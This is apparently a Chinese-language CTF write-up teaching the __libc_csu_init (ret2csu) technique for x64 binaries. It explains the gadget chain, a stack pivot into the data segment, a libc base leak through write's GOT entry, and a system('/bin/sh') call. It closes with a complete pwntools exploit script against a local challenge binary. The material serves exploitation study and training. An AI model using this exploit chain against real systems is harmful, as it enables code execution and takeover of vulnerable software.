TITLE __libc_csu_init攻击方法详细讲解

TAG __libc_csu_init

SUMMARY 详细介绍了__libc_csu_init文件及利用方法

DATE 2026-07-04

# 考到的知识点：

1. 栈溢出
2. 栈劫持
3. __libc_csu_init
4. 动态调用
5. 无system函数的系统调用


# 原理解释：

- x64下会用一个函数专门来对libc进行初始化操作（在elf文件IDA伪码左侧中就可以看到这个函数）这个函数一定会存在
- 这个函数里的asm有很多pop; ret之类的有用的ROP

# 适用场景：

- gadgets不存在，找不全的情况。
- 普遍适用（在不同版本中，都可以控制rdi、rsi、rdx）

# __libc_csu_init汇编（关键部分）

![Pasted image 20260314213724.png](<../pictures/Pasted image 20260314213724.png>)

# ROP的构建（找到基本ROP）：

![Pasted image 20260314213947.png](<../pictures/Pasted image 20260314213947.png>)

**这里是第一个坑点**，当时就选的是0x40079c，结果因为__libc_csu_init函数的这串asm最后要验证rbx和rbp的值，如果不进行修改的话就会不断循环，所以一定要设置含设置这两个寄存器的ROP

![Pasted image 20260314214044.png](<../pictures/Pasted image 20260314214044.png>)

![Pasted image 20260314214203.png](<../pictures/Pasted image 20260314214203.png>)

- 在asm中可以看到，从0x40079A开始，asm会一直执行，直到遇到ret

首先考虑到这个题目没有system和binsh，所以又涉及到动态系统调用（运用libc函数）
函数存在明显栈溢出点
checksec显示：

![Pasted image 20260314214413.png](<../pictures/Pasted image 20260314214413.png>)

可以确定基本的思路：

# 基本思路确定（反向）：

- getshell
- system('/bin/sh')
- 动态调用没有plt，运用libc库找到system，然后用read或者gets获取输入得到binsh
- 获取libc基址
- 运用write函数打印处write的地址，进而计算得到libc基址
- 运用程序中__libc_csu_init已有的ROP，call r12，可以调用程序自带的got（read，write）
- ![Pasted image 20260314214856.png](<../pictures/Pasted image 20260314214856.png>)
- 运用已知的ROP，可以依次设定参数值，然后调用函数
- 栈溢出
**这里要注意**，结合所有的步骤，可以考虑到payload可能过长，导致程序崩溃无法getshell，所以要先栈劫持，将payload写到安全的地方。

# exp解析：

1. 最开始的函数，是因为考虑到后续的函数执行都需要构造这么一长串payload，所以简化为函数
2. pop6_ret，为![Pasted image 20260314215527.png](<../pictures/Pasted image 20260314215527.png>)
3. call_rop为![Pasted image 20260314215554.png](<../pictures/Pasted image 20260314215554.png>)
4. 先看下面的
   ![Pasted image 20260314215623.png](<../pictures/Pasted image 20260314215623.png>)
   - 前面是再熟悉不过的栈溢出，然后是rop调用read函数
   - 接着rsp3，然后rop_addr - 0x18，这里是栈劫持，rop_addr是后续真正攻击payload的存储地，一般选data或者bss段作为存储的地址较为保险。这里的rop_addr选的是data段
   - 0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
   - 后面 - 0x18 是 8 x 3，用于抵消rsp3多余的pop
   - 这里的填充是为了
1. 回到rop函数上，先将参数弹到r13这些上，顺便把rbx和rbp的值设置了，然后转移参数到正宗的参数寄存器上。后面的p64(0) * 7 是为了调整栈结构，防止崩溃（pop6_ret弹出了7个栈位置，所以为7）
2. 由于payload1设置了read函数，在写rop_data的时候，后面要send
3. rop_data为了方便后续binsh的读取，所以也设置了read
4. rop_data 先用 write 函数打印出write的got，后面bss_addr是后续system调用的基础，由于第二个read读取binsh，存储在bss_addr上，所以 rop(bss_addr, 0, 0, bss_addr + 8) 是调用system函数，在x64中，为8位，bss_addr + 8 即为 后续payload system函数
5. 后续就是很常规的接收泄露的write got和构造最终提权payload2进行提权
6. 最后interactive提权



# exp：

```python
from pwn import *
import struct
import re

context(arch='amd64', os='linux')
context.log_level = 'debug'

def rop(p1, p2 ,p3, call_addr):
    pop6_ret = 0x40079A
    call_rop = 0x400780  # mov

    payload = p64(pop6_ret)
    payload += p64(0) + p64(1)
    payload += p64(call_addr) + p64(p3) + p64(p2) + p64(p1)
    payload += p64(call_rop)
    payload += p64(0) * 7

    return payload

p = process('./a')
p.recvuntil(b'ret2_libc_csu_init\n')
# gdb.attach(p, 'b *0x400714')

elf = ELF('./a')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

bss_addr = 0x601800
rop_addr = 0x601300
rsp3 = 0x000000000040079d   # pop rsp, r12,,,,for stack smashing

payload1 = b'a' * 0x100 + p64(0)
payload1 += rop(0, rop_addr, 0x300, elf.got['read'])
payload1 += p64(rsp3) + p64(rop_addr - 0x18)   # stack smashing
payload1 = payload1.ljust(0x200, b'\x00')
p.send(payload1)

rop_data = b''
rop_data += rop(1, elf.got['write'], 8, elf.got['write'])
rop_data += rop(0, bss_addr, 0x10, elf.got['read'])
rop_data += rop(bss_addr, 0, 0, bss_addr + 8)
rop_data = rop_data.ljust(0x300, b'\x00')
assert len(rop_data) <= 0x300
p.send(rop_data)

leak_addr = u64(p.recv(8))
libc_base = leak_addr - libc.symbols['write']
libc.address = libc_base
print(hex(libc_base))

system = libc.symbols['system']
payload2 = b'/bin/sh\x00' + p64(system)
p.send(payload2)

p.interactive()

```